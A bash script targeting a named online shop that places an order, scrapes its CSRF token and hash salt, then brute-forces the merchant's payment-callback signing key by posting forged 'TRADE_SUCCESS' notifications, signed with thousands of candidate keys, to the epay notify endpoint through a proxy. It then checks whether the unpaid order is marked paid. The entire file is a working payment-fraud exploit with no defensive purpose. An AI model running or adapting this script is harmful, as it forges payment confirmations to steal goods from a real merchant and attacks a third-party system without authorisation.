#!/bin/bash
# Usage: bash xuxin66_pay_notify.sh TID CID KEYFILE
source /data/config/proxy.env
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
BASE="https://xuxin66.top/shop"
CK=/tmp/xuxin66_d6d_ck.txt
TID="${1:-1310}"
CID="${2:-15}"
KEYFILE="${3:-/data/tmp/xuxin66_d6d_nkeys.txt}"
rm -f "$CK"
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 25 -A "$UA" "$BASE/" -o /tmp/d6d_home.html
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 20 -A "$UA" "$BASE/?mod=buy&cid=$CID&tid=$TID" -o /tmp/d6d_buy.html
python3 - <<'PY'
import re,subprocess,sys
h=open('/tmp/d6d_buy.html',encoding='utf-8',errors='ignore').read()
c=re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"',h)
hs=re.search(r'var hashsalt=(.+?);',h)
csrf=c.group(1) if c else ''
expr=hs.group(1) if hs else ''
open('/tmp/d6d_csrf.txt','w').write(csrf)
open('/tmp/d6d_hs_expr.txt','w').write(expr)
hsalt=''
if expr:
  p=subprocess.run(['node','-e',f'console.log({expr})'],capture_output=True,text=True,timeout=10)
  hsalt=p.stdout.strip()
open('/tmp/d6d_hsalt.txt','w').write(hsalt)
print('csrf',csrf[:16],'hs',hsalt)
PY
CSRF=$(cat /tmp/d6d_csrf.txt)
HS=$(cat /tmp/d6d_hsalt.txt)
INPUT="kami$(date +%H%M%S)"
echo INPUT=$INPUT TID=$TID
PAY=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 15 -A "$UA" -e "$BASE/?mod=buy&cid=$CID&tid=$TID" \
  -H "X-Requested-With: XMLHttpRequest" -X POST \
  --data-urlencode "tid=$TID" --data-urlencode "inputvalue=$INPUT" --data-urlencode "num=1" \
  --data-urlencode "hashsalt=$HS" --data-urlencode "csrf_token=$CSRF" \
  "$BASE/ajax.php?act=pay")
echo PAY=$PAY
TRADE=$(python3 -c "import json,sys;print(json.loads(sys.argv[1]).get('trade_no',''))" "$PAY" 2>/dev/null || true)
echo TRADE=$TRADE
[ -z "$TRADE" ] && exit 1
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 15 -A "$UA" "$BASE/other/submit.php?type=alipay&orderid=$TRADE" -o /tmp/d6d_sub.html
URL=$(grep -oE 'https?://[^\"'\'' <>]+' /tmp/d6d_sub.html | head -1)
echo SUBMIT_URL=$URL
MONEY=$(echo "$URL" | grep -oE 'money=[0-9.]+' | head -1 | cut -d= -f2); MONEY=${MONEY:-10}
PID=$(echo "$URL" | grep -oE 'pid=[0-9]+' | head -1 | cut -d= -f2); PID=${PID:-1003}
echo MONEY=$MONEY PID=$PID
export PROXY_URL CK BASE UA TRADE MONEY PID
try(){
  key="$1"
  sign=$(MONEY="$MONEY" TRADE="$TRADE" PID="$PID" KEY="$key" python3 -c 'import hashlib,os;p={"pid":os.environ["PID"],"type":"alipay","out_trade_no":os.environ["TRADE"],"notify_url":"https://xuxin66.top/shop/other/epay_notify.php","return_url":"https://xuxin66.top/shop/other/epay_return.php","name":"test","money":os.environ["MONEY"],"trade_no":os.environ["TRADE"],"trade_status":"TRADE_SUCCESS"};items=sorted(k for k in p if p[k]!="");s="&".join(f"{k}={p[k]}" for k in items)+os.environ["KEY"];print(hashlib.md5(s.encode()).hexdigest())')
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 5 -A "$UA" -X POST \
    --data-urlencode "pid=$PID" --data-urlencode "type=alipay" --data-urlencode "out_trade_no=$TRADE" \
    --data-urlencode "trade_no=$TRADE" --data-urlencode "notify_url=https://xuxin66.top/shop/other/epay_notify.php" \
    --data-urlencode "return_url=https://xuxin66.top/shop/other/epay_return.php" --data-urlencode "name=test" \
    --data-urlencode "money=$MONEY" --data-urlencode "trade_status=TRADE_SUCCESS" --data-urlencode "sign=$sign" \
    --data-urlencode "sign_type=MD5" "$BASE/other/epay_notify.php")
  if [ -n "$r" ] && [ "$r" != "error" ] && [ "$r" != "fail" ] && [ "$r" != "FAIL" ]; then
    echo "NOTIFYHIT|$key|$r"
  fi
}
export -f try
# first 2000 keys
head -2000 "$KEYFILE" > /tmp/nk.txt
cat /tmp/nk.txt | xargs -P 4 -I{} bash -c 'try "$@"' _ {}
echo GS=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" "$BASE/other/getshop.php?trade_no=$TRADE")
enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$INPUT")
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 10 -A "$UA" "$BASE/?mod=query&data=$enc" -o /tmp/d6d_q2.html
grep -q showOrder /tmp/d6d_q2.html && echo PAIDQUERY && grep -oE "showOrder\([^)]+\)" /tmp/d6d_q2.html | head
echo NOTIFY_DONE
